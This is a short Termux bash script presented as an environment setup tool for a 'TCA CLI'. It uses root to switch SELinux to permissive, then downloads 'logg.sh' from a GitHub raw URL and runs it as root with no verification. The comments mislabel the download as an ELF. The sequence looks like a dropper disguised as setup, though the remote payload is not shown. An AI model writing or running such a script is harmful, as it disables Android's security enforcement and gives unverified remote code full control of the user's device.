#!/data/data/com.termux/files/usr/bin/bash

########################################
#  TCA CLI Environment Setup Script: 1.2
########################################
#
#
#
########################################
#
# Dependencies: bash and curl.
#
########################################

# Update and upgrade
pkg update -y && pkg upgrade -y

# Switch permissive
su -c 'setenforce 0'

# Install dependencies
pkg install tsu
pkg install wget

# Fetch the ELF and setup
tsu -c 'wget https://raw.githubusercontent.com/aday-all/aday-all/master/logg.sh'
tsu -c 'chmod +x logg.sh'
tsu -c ./logg.sh


